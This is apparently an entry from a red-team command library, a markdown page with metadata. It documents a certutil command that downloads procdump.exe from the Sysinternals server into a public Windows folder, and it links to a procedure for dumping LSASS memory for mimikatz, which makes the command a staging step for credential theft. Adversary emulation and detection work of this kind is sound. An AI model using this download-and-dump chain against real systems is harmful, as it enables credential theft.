---
id: 6d74e531-cf88-4de3-abb1-79e262a99ae9
name: download-procdump-http
type: command
executor: cmd
data: >-
  certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe
  C:\Users\Public\procdump.exe
output: null
created_at: '2023-04-06T03:56:27.176935+00:00'
updated_at: '2023-04-10T20:37:14.787792+00:00'
platforms:
  - Windows
tags:
  - download
  - http
verified: true
validated: true
---

# download-procdump-http

## Command

```cmd
certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
```

## Description

Downloads procdump.exe from the Sysinternals live server using certutil, a built-in Windows tool for URL caching and certificate management.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -urlcache | Uses URL cache to download the file | Yes |
| -split | Splits response into cache entries | Yes |
| -f | Forces download even if file exists | Yes |
| http://live.sysinternals.com/procdump.exe | Source URL for procdump.exe | Yes |
| C:\Users\Public\procdump.exe | Local destination path | Yes |

## Examples

### Basic Usage

```cmd
certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
```

## Expected Output

```
CertUtil: -URLcache command completed successfully.
```

Verify with dir C:\Users\Public\procdump.exe.

## Related

- [[procedures/windows-lsass-mini-dump-for-mimikatz]]
